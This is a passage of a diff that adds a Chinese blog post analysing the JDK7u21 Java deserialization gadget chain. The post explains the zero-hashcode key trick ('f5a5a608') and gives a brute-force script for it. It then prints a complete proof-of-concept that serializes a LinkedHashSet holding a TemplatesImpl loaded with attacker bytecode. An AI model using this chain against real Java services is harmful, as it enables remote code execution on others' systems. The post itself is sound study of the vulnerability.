+    <span class="n">result</span> <span class="o">+=</span> <span class="o">(</span><span class="n">127</span> <span class="o">*</span> <span class="n">e</span><span class="o">.</span><span class="na">getKey</span><span class="o">().</span><span class="na">hashCode</span><span class="o">())</span> <span class="o">^</span>
+    	<span class="n">memberValueHashCode</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
+  <span class="o">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>如果 Entry 的 value 的 Class 不为 Array，也就是当 memberValues 中只有一个key和一个value时，则 <code>memberValueHashCode()</code> 函数返回 <code>value.hashCode()</code>，在这里相当于</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">127</span> <span class="o">*</span> <span class="n">key</span><span class="o">.</span><span class="na">hashCode</span><span class="o">()</span> <span class="o">^</span> <span class="n">value</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>所以我们控制他的key.hashCode为0就好了，这样result结果就变成了<code>value.hashCode()</code></p>
+<p>而这个hashCode为0的字符是存在的，这里可以用这个脚本来爆破</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">bruteHashCode</span><span class="o">()</span>
+<span class="o">{</span>
+  <span class="k">for</span> <span class="o">(</span><span class="kt">long</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">9999999999L</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">Long</span><span class="o">.</span><span class="na">toHexString</span><span class="o">(</span><span class="n">i</span><span class="o">).</span><span class="na">hashCode</span><span class="o">()</span> <span class="o">==</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
+    	<span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">Long</span><span class="o">.</span><span class="na">toHexString</span><span class="o">(</span><span class="n">i</span><span class="o">));</span>
+  	<span class="o">}</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里可以用<code>f5a5a608</code>也是ysoserial用的字符</p>
+<p>那么会发现在第二次put的时候，计算的hash就是相同的了</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221025221822131.png" title="image-20221025221822131" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221025221822131.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221025221822131.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221025221822131.png, https://tuchuang.huamang.xyz/img/image-20221025221822131.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221025221822131.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221025221822131.png">
+    </a></p>
+<p>那么后面就接上了我们之前说的动态代理</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221026011053199.png" title="image-20221026011053199" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221026011053199.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221026011053199.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221026011053199.png, https://tuchuang.huamang.xyz/img/image-20221026011053199.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221026011053199.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221026011053199.png">
+    </a></p>
+<p>进入到Templatesimpl加载字节码</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221026011134298.png" title="image-20221026011134298" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221026011134298.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221026011134298.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221026011134298.png, https://tuchuang.huamang.xyz/img/image-20221026011134298.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221026011134298.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221026011134298.png">
+    </a></p>
+<h2 id="poc" class="headerLink">
+    <a href="#poc" class="header-mark"></a>POC</h2><p>有两个小点</p>
+<ul>
+<li>先定义无害HashMap，在LinkHashSet完成add操作后再把恶意代码加进去</li>
+<li>HashMap的value设定和LinkHashSet同款的TemplatesImpl对象来绕过hash</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.ClassClassPath</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Proxy</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashSet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.LinkedHashSet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">JDK7u21</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+        <span class="n">CtClass</span> <span class="n">clazzz</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;EvilTest&#34;</span><span class="o">);</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">clazzz</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+        <span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">code</span><span class="o">});</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;HelloTemplatesImpl&#34;</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">&#34;_tfactory&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
+
+        <span class="n">String</span> <span class="n">zeroHashCodeStr</span> <span class="o">=</span> <span class="s">&#34;f5a5a608&#34;</span><span class="o">;</span>
+
+        <span class="c1">// 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值
+</span><span class="c1"></span>        <span class="n">HashMap</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">zeroHashCodeStr</span><span class="o">,</span> <span class="s">&#34;1&#34;</span><span class="o">);</span>
+
+        <span class="c1">// 实例化AnnotationInvocationHandler类
+</span><span class="c1"></span>        <span class="n">Constructor</span> <span class="n">handlerConstructor</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">handlerConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">InvocationHandler</span> <span class="n">tempHandler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">handlerConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">map</span><span class="o">);</span>
+
+        <span class="c1">// 为tempHandler创造一层代理
+</span><span class="c1"></span>        <span class="n">Templates</span> <span class="n">proxy</span> <span class="o">=</span> <span class="o">(</span><span class="n">Templates</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">JDK7u21</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="n">tempHandler</span><span class="o">);</span>
+
+        <span class="c1">// 实例化HashSet，并将两个对象放进去
+</span><span class="c1"></span>        <span class="n">HashSet</span> <span class="n">set</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LinkedHashSet</span><span class="o">();</span>
+        <span class="n">set</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>
+        <span class="n">set</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">proxy</span><span class="o">);</span>
+
+        <span class="c1">// 将恶意templates设置到map中
+</span><span class="c1"></span>        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">zeroHashCodeStr</span><span class="o">,</span> <span class="n">templates</span><span class="o">);</span>
+
+        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">set</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
+        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">()));</span>
+        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="o">(</span><span class="n">Object</span><span class="o">)</span><span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="思考" class="headerLink">
+    <a href="#%e6%80%9d%e8%80%83" class="header-mark"></a>思考</h1><p>这个链子算是我前几个分析过来比较复杂的，对于这个链子，我有几个思考，这里我打算详细的去跟进程序分析一下</p>
+<p>看POC首先是他用了个HashMap，为什么这里要利用这么一个HashMap？</p>
+<p>这里我对POC进行调试，发现readObject的时候，触发了两次put，顺序为：<code>TemplatesImpl -&gt; proxy</code></p>
+<p>在第一次的put中，然后key通过<code>addEntry()</code>存入table中</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221026022800758.png" title="image-20221026022800758" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221026022800758.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221026022800758.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221026022800758.png, https://tuchuang.huamang.xyz/img/image-20221026022800758.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221026022800758.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221026022800758.png">
+    </a></p>
+<p>那么第二次proxy进去的put的时候，我们再debug分析一下，因为这里我们是使用AnnotationInvocationHandler来代理了HashMap</p>
+<p>所以这里的Templates是这样的，HashMap的键为f5a5a608，值为TemplatesImpl对象</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="nd">@javax.xml.transform.Templates</span><span class="o">(</span><span class="n">f5a5a608</span><span class="o">=</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xalan</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">xsltc</span><span class="o">.</span><span class="na">trax</span><span class="o">.</span><span class="na">TemplatesImpl</span><span class="nd">@18c78bdb</span><span class="o">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>我们跟进他的hash计算，这里进入hashCode()</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221026021848182.png" title="image-20221026021848182" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221026021848182.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221026021848182.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221026021848182.png, https://tuchuang.huamang.xyz/img/image-20221026021848182.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221026021848182.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221026021848182.png">
+    </a></p>
+<p>因为是代理，所以进了invoke，执行的方法是hashCode，所以进入了hashCodeImpl</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221026021954167.png" title="image-20221026021954167" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221026021954167.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221026021954167.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221026021954167.png, https://tuchuang.huamang.xyz/img/image-20221026021954167.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221026021954167.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221026021954167.png">
+    </a></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221026022125478.png" title="image-20221026022125478" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221026022125478.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221026022125478.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221026022125478.png, https://tuchuang.huamang.xyz/img/image-20221026022125478.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221026022125478.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221026022125478.png">
+    </a></p>
+<p>这里因为只有一对键值对，所以算法简化成<code>127 * key.hashCode() ^ value.hashCode();</code></p>
+<p>那么重点就来了，这里key是我们精心构造的，他的hashCode()结果为0，而这个value，我们为他设置的是恶意的TemplatesImpl对象，<strong>重要的是这个TemplatesImpl对象和LinkedHashSet第一个put的是同款</strong>，所以导致了LinkedHashSet的两个对象，他们的hashcode是一样的</p>
+</div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-10-24</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/cc7/" class="prev" rel="prev" title="[Java安全] CommonsCollections7链分析"><i class="fas fa-angle-left fa-fw"></i>[Java安全] CommonsCollections7链分析</a></div>
+</div>
+</article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">2022</div><div class="footer-line"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Huamang</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp"><a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2021001334号</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.0/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.11.0/dist/algoliasearch.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/topbar@1.0.1/topbar.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@sliphua/pjax@2.4.0/dist/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+
+<div class="pjax-assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js"></script></div>
+</body>
+
+</html>
